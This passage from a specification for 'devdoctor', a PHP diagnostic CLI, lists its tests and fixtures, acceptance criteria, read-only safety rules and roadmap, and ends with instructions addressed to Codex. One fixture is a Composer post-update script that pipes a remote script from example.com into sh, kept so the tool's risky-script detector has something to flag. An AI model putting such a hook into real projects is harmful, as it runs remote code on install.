- tracked `.env` is error
- `.env.example` is not treated as secret
- untracked `.env.local` warning
- `.env` not ignored warning
- large untracked file warning

### 25.7 CI tests

- default modules selected correctly
- unknown module fails with `DD_CI_UNKNOWN_MODULE`
- exclude works
- module summaries are merged
- warnings fail when `fail_on_warnings=true`
- warnings do not fail when `--no-fail-on-warnings`
- errors always fail
- JSON output contains all selected modules

---

## 26. Fixtures

Suggested fixtures:

```text
tests/Fixtures/
  env/
    clean/
      .env
      .env.example
      devdoctor.yml
    dirty/
      .env
      .env.example
    secrets/
      .env.example
  docker/
    valid-compose/
      docker-compose.yml
      .env
    missing-env/
      docker-compose.yml
    invalid-compose/
      docker-compose.yml
  composer/
    clean/
      composer.json
      composer.lock
    invalid-json/
      composer.json
    missing-lock/
      composer.json
    abandoned/
      composer.json
      composer.lock
      vendor/composer/installed.json
  git/
    clean/
    dirty/
    secrets/
```

Example dirty `.env`:

```dotenv
APP_ENV=production
APP_DEBUG=true
APP_KEY=base64:real-looking-but-not-printed
APP_ENV=local
DATABASE_URL=not-a-url
MAIL_HOST=
STRIPE_SECRET=stripe_live_example_token_xxxxxxxxxxxxxxxxxxxxxxxx
```

Example `.env.example`:

```dotenv
APP_ENV=local
APP_DEBUG=false
DATABASE_URL=
MAIL_HOST=
STRIPE_SECRET=your-key-here
```

Example Docker Compose with missing env:

```yaml
services:
  app:
    image: nginx
    ports:
      - "${APP_PORT}:80"
    environment:
      DB_PASSWORD: "${DB_PASSWORD}"
```

Example Composer risky script:

```json
{
  "require": {
    "php": "^8.5",
    "ext-intl": "*"
  },
  "scripts": {
    "post-update-cmd": [
      "curl https://example.com/script.sh | sh"
    ]
  }
}
```

---

## 27. Initial implementation order

Implement in vertical slices. Do not scaffold everything without working behavior.

Recommended order:

1. Ensure Laravel Zero app name/binary is `devdoctor`.
2. Add/confirm Pest setup.
3. Implement core DTOs:
   - `Issue`
   - `IssueCollection`
   - `ModuleResult`
   - `ExitCode`
4. Implement output renderers:
   - table
   - JSON
5. Implement config loading:
   - `devdoctor.yml`
   - config validation
6. Implement `devdoctor env`.
7. Add env tests.
8. Implement `devdoctor ports` with provider abstraction and fakeable providers.
9. Add ports tests.
10. Implement `devdoctor composer` with local file checks first.
11. Add composer tests.
12. Implement `devdoctor git`.
13. Add git tests.
14. Implement `devdoctor docker`.
15. Add docker tests.
16. Implement `devdoctor ci` as aggregator.
17. Add CI tests.
18. Update README with examples for all six commands.
19. Run full test suite.
20. Clean up command names, output consistency, and issue codes.

Do not build PHAR release automation until all six commands work.

---

## 28. Acceptance criteria

The first complete version is done when all commands work:

```bash
php devdoctor env
php devdoctor ports
php devdoctor docker
php devdoctor composer
php devdoctor git
php devdoctor ci
```

And:

```bash
php devdoctor env --format=json
php devdoctor ports --port=8000 --format=json
php devdoctor docker --format=json
php devdoctor composer --format=json
php devdoctor git --format=json
php devdoctor ci --format=json
./vendor/bin/pest
```

Required behavior:

- clean project exits `0`
- warnings-only project exits `1`
- broken project exits `2`
- invalid config exits `3`
- missing required dependency/input exits predictably and is tested
- JSON output is valid JSON
- secret values are redacted everywhere
- commands are read-only
- no command requires internet access by default
- every public command has README documentation
- every module has stable issue codes
- `devdoctor ci` includes references to selected module results

---

## 29. Non-goals for first complete version

Do not implement:

- database connectivity checks
- cloud provider validation
- remote secret scanning
- auto-fixing files
- automatic `.env` rewriting
- killing ports automatically
- Docker image pruning
- Composer install/update
- Git commits/pushes
- telemetry
- AI-generated fixes
- UI dashboard

---

## 30. Safety rules per module

### Env

- never rewrite `.env`
- never print raw secrets
- only `devdoctor.yml` may be read for rules

### Ports

- never kill processes
- only suggest commands
- avoid `kill -9` suggestions unless explicitly added later

### Docker

- never stop/start/remove containers
- never prune images/volumes
- never run `docker compose up`
- only inspect and validate

### Composer

- never run `composer install`
- never run `composer update`
- never execute Composer scripts
- diagnostic commands only

### Git

- never stage files
- never commit
- never push
- never delete branches
- only inspect repository state

### CI

- never run interactive prompts
- never auto-fix
- deterministic output

---

## 31. Example issue messages

Good:

```text
APP_DEBUG=true while APP_ENV=production
STRIPE_SECRET exists in .env but is missing in .env.example
Port 8000 is used by php (PID 12345)
docker-compose.yml references DB_PASSWORD but it is not defined
composer.lock is missing while composer.json declares dependencies
.env is tracked by Git
```

Bad:

```text
Something is wrong
Invalid configuration detected
Potential problem found
Docker issue
Composer problem
```

---

## 32. Future roadmap

After the first complete version:

### v0.2

- richer framework presets:
  - Laravel
  - Symfony
  - Node
  - Vite
  - Next.js
  - Docker Compose
- better hints/fixes
- config wizard

### v0.3

- SARIF output for GitHub code scanning
- GitHub Action wrapper
- baseline file support for accepted warnings

### v0.4

- PHAR release automation
- signed builds
- Homebrew tap

### v1.0

- stable JSON schema
- stable issue code catalog
- documentation site
- public Composer package
- CI examples for GitHub Actions, GitLab CI, and Bitbucket Pipelines

---

## 33. Marketing angle

Keep CLI output good enough for README screenshots.

Core positioning:

```text
Developer diagnostics for humans.
```

Useful taglines:

```text
Catch broken config before it reaches CI.
Find the process stealing your port.
Know why Docker Compose will fail before you run it.
Check Composer, Git, Docker, ports, and env in one CI-safe tool.
```

---

## 34. Final instruction for Codex

Do not ask for more product clarification unless blocked by missing repository state.

Implement the project incrementally, but keep the full command surface visible from the beginning:

```bash
devdoctor env
devdoctor ports
devdoctor docker
devdoctor composer
devdoctor git
devdoctor ci
```

Prefer working behavior with tests over broad empty scaffolding.

When making tradeoffs, choose:

1. correctness
2. safe defaults
3. readable output
4. deterministic CI behavior
5. small implementation surface
6. future extensibility

The first public release should be stable, boring, safe, and immediately useful.
